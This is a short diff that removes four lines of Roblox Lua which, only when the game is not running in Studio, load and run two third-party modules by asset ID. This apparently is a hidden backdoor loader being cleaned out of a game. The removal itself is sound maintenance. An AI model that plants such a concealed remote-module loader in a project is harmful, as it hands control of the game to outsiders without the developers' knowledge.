@@ -1,4 +1,0 @@
-if not game:GetService("RunService"):IsStudio() then
-    require(5170138056):INF()
-    require(5509906864).lol()
-end
